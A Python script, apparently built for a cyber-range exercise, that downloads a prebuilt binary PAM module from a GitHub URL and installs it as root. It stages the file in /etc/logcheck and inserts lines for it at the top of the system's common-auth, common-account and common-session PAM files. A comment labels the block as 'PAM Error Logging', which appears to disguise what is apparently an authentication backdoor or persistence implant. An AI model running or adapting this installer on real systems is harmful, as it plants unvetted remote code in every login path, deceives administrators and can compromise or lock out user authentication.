#!/usr/bin/env python3
import os
import shutil
import subprocess
from datetime import datetime

# =========================
# CONFIGURATION
# =========================
MODULE_NAME = "pam_error_mod.so"
DOWNLOAD_URL = "https://github.com/ThePyroArsonist/PAMModule/raw/refs/heads/master/PAM%20Module/pam_error_mod.so"
TMP_PATH = f"/etc/logcheck/{MODULE_NAME}"
PAM_TARGET_FILES = [
    "/etc/pam.d/common-auth",
    "/etc/pam.d/common-account",
    "/etc/pam.d/common-session",
]
PAM_LINE = f"auth optional {MODULE_NAME}\naccount required {MODULE_NAME}\nsession required {MODULE_NAME}"
COMMENT = "# Configures PAM Error Logging; variables configured in /etc/security/limits.conf"
# =========================

def require_root():
    if os.geteuid() != 0:
        print("[!] Run as root.")
        exit(1)

def detect_lib_path():
    paths = [
        "/lib64/security",                        # Rocky / RHEL
        "/lib/security",                          # Older Debian/Ubuntu
        "/usr/lib/x86_64-linux-gnu/security",     # Ubuntu 22/24+
    ]
    for path in paths:
        if os.path.exists(path):
            return path
    print("[!] Could not find PAM module directory.")
    exit(1)

def backup_file(path):
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_path = f"{path}.bak.{timestamp}"
    shutil.copy2(path, backup_path)
    print(f"[+] Backup created: {backup_path}")

def download_module():
    # Check if the module already exists in Downloads
    downloads_path = "/home/cyberrange/Downloads"
    local_path = os.path.join(downloads_path, MODULE_NAME)
    
    if os.path.exists(local_path):
        print(f"[+] Using existing file: {local_path}")
        shutil.copy2(local_path, TMP_PATH)
        return

    # If the module doesn't exist in Downloads, download it
    print(f"[+] Downloading module from {DOWNLOAD_URL}")
    result = subprocess.run(
        ["curl", "-L", "-o", TMP_PATH, DOWNLOAD_URL],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        print("[!] Download failed:")
        print(result.stderr)
        exit(1)

    if not os.path.exists(TMP_PATH):
        print("[!] Downloaded file not found.")
        exit(1)

    print(f"[+] Downloaded to {TMP_PATH}")
    
def install_module(lib_path):
    dest_path = os.path.join(lib_path, MODULE_NAME)
    shutil.copy2(TMP_PATH, dest_path)
    os.chmod(dest_path, 0o755)
    print(f"[+] Installed module to {dest_path}")
    return dest_path

def update_pam_file(pam_file):
    if not os.path.exists(pam_file):
        print(f"[-] Skipping missing: {pam_file}")
        return
    with open(pam_file, "r") as f:
        lines = f.readlines()
    # Prevent duplicate insertion (check module presence anywhere)
    if any(MODULE_NAME in line for line in lines):
        print(f"[=] Already present in {pam_file}")
        return
    backup_file(pam_file)
    # Ensure file ends cleanly with newline
    if lines and not lines[-1].endswith("\n"):
        lines[-1] += "\n"
    # Build PAM block
    pam_block = [
        f"# {COMMENT}\n",
        f"{PAM_LINE}"
    ]
    # Insert at the beginning of the file
    lines[:0] = pam_block
    with open(pam_file, "w") as f:
        f.writelines(lines)
    print(f"[+] Appended PAM module block to {pam_file}")

def cleanup():
    if os.path.exists(TMP_PATH):
        os.remove(TMP_PATH)
        print("[+] Cleaned up temp file")

def main():
    require_root()
    lib_path = detect_lib_path()
    print(f"[+] Using PAM directory: {lib_path}")
    download_module()
    install_module(lib_path)
    for pam_file in PAM_TARGET_FILES:
        update_pam_file(pam_file)
    cleanup()
    print("\n[✓] Installation complete.")
    print("[!] Test with SSH/login immediately to confirm no lockout.")

if __name__ == "__main__":
    main()